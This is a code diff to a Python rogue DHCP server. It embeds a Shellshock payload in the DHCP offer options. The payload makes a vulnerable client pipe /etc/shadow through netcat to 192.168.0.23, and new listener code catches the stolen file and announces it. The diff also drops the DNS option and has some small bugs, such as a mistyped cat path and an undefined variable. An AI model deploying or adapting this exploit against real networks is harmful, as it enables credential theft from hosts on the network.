@@ -37,11 +37,20 @@ class Listener:
             for each in r:
                 print('Recieved Something!')
                 frame, void = each.recvfrom(10000)
+                print(void)
+                time.sleep(5)
                 print(frame)
+
+                if frame.startswith(b'root'):
+                    print('[!] Got shadow file')
+                    print(frame)
+                    exit()
+                    break
 
 
                 dhcp_message = [frame[i:i+1] for i in range(0, len(frame), 1)]
                 dhcpPacket = DhcpPacket(dhcp_message)
+
 
                 if dhcpPacket.op == [b'\x02']:
                     # This is a reply not a request, it has come from a dhcp server and is junk
@@ -58,7 +67,7 @@ class Listener:
                         self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
                         self.client_list.append(x)
                         print(self.current_discovery)
-                        self.current_discovery.remove(each)
+                        self.current_discovery.remove(eachPacket)
 
                 # if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
                 #     print('[+] Crafting ACK')
@@ -86,7 +95,7 @@ class DhcpPacket:
     def __init__(self, dhcp_message):
         # print(dhcp_message)
         # print(len(dhcp_message))
-        self.exploit = b"() { :;}; /bin/cat /etc/shadow > /tmp/shadow; /bin/cat/ /etc/shadow | nc -u 192.168.0.23 67 "  # % (self.ip, self.port)
+        self.exploit = b"() { :;};/bin/cat/ /etc/shadow | nc -u 192.168.0.23 67"  # % (self.ip, self.port)
         self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
         # print(self.exploit)
         # print(len(self.exploit))
@@ -198,11 +207,11 @@ class DhcpPacket:
         options = [b'\x35', b'\x01', b'\x05',  # DHCP, len, Offer
                    b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
                    b'\x03', b'\x04', dhcpServer.router_ip,
-                   b'\x06', b'\x05', dhcpServer.primary_dns,
+                   #b'\x06', b'\x05', dhcpServer.primary_dns,
                    b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
                    b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
                    b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
-                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17',  # DHCP server identifier (ip address)
+                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\00', b'\x17',  # DHCP server identifier (ip address)
                    b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                    b'\xff',  # end flag
                    # padding to end at word boundry for the options
